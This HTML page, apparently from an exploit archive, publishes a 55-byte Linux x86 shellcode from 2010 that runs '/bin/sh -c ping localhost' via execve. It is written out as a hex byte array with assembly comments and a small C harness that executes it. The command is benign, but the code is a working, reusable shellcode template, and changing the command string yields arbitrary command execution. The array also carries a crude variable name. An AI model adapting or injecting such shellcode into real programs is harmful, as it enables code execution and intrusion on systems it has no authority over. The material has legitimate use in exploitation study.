<html><head><title>Linux/x86 - sys_execve(/bin/sh, -c, ping localhost) - 55 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Name   : 55 bytes sys_execve(&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ping localhost&quot;) x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslinger.devilzc0de.com
tested on : linux debian
*/

char asshole[] = &quot;\x6a\x0b&quot;             // push   $0xb
		&quot;\x58&quot;                  // pop    %eax
		&quot;\x99&quot;                  // cltd
		&quot;\x52&quot;                  // push   %edx
		&quot;\x68\x73\x74\x20\x20&quot;  // push   $0x20207473
		&quot;\x68\x61\x6c\x68\x6f&quot;  // push   $0x6f686c61
		&quot;\x68\x20\x6c\x6f\x63&quot;  // push   $0x636f6c20
		&quot;\x68\x70\x69\x6e\x67&quot;  // push   $0x676e6970
		&quot;\x89\xe6&quot;              // mov    %esp,%esi
		&quot;\x52&quot;                  // push   %edx
		&quot;\x66\x68\x2d\x63&quot;      // pushw  $0x632d
		&quot;\x89\xe1&quot;              // mov    %esp,%ecx
		&quot;\x52&quot;                  // push   %edx
		&quot;\x68\x2f\x2f\x73\x68&quot;  // push   $0x68732f2f
		&quot;\x68\x2f\x62\x69\x6e&quot;  // push   $0x6e69622f
		&quot;\x89\xe3&quot;              // mov    %esp,%ebx
		&quot;\x52&quot;                  // push   %edx
		&quot;\x56&quot;                  // push   %esi
		&quot;\x51&quot;                  // push   %ecx
		&quot;\x53&quot;                  // push   %ebx
		&quot;\x89\xe1&quot;              // mov    %esp,%ecx
		&quot;\xcd\x80&quot;;             // int    $0x80
		
int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) asshole;
  (int)(*func)();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
